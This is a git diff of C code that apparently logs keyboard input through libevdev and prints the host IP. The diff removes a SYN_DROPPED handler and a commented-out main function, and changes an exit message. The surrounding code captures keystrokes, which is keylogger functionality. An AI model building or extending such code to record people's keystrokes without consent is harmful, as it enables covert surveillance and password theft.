@@ -76,23 +76,6 @@ void log_device(key_package* key_package) {
   printf("Host IP: %s\n", IPbuffer);
 }
 
-void handle_syn_dropped(struct libevdev* dev) {
-  struct input_event ev;
-  int rc = LIBEVDEV_READ_STATUS_SYNC;
-
-  while (rc == LIBEVDEV_READ_STATUS_SYNC) {
-    rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_SYNC, &ev);
-    if (rc < 0) {
-      if (rc != -EAGAIN) fprintf(stderr, "error %d (%s)\n", -rc, strerror(-rc));
-      return;
-    }
-
-    printf("State change since SYN_DROPPED for %s %s value %d\n",
-           libevdev_event_type_get_name(ev.type),
-           libevdev_event_code_get_name(ev.type, ev.code), ev.value);
-  }
-}
-
 void log_keys(key_package* key_package) {
   // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
 
@@ -169,10 +152,6 @@ void log_keys(key_package* key_package) {
       // note that this section runs when no event is occurring, NOT necessarily
       // when there is an error printf("value of rc: %d\n", rc);
       if (rc != -EAGAIN) printf("1 error: %d %s\n", -rc, strerror(-rc));
-      // exit(0);
-    } else if (rc == LIBEVDEV_READ_STATUS_SYNC) {
-      printf("handling syn drop\n");
-      handle_syn_dropped(keyboard_dev);
     } else if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
       // handle event here
 
@@ -208,7 +187,7 @@ void log_keys(key_package* key_package) {
     // upon pressing "c" (represented by code 46), it should write to the
     // file every few seconds.
     if (ev.code == 107) {
-      printf("exiting\n");
+      printf("\nexiting\n");
 
       break;
     }
@@ -227,11 +206,3 @@ void print_logged_keys(key_package key_package) {
   }
   printf("\n");
 }
-
-// void main(void) {
-//   key_package key_package;
-//   key_package.keys_arr_size = 0;
-//   log_device(&key_package);
-//   log_keys(&key_package);
-//   print_logged_keys(key_package);
-// }
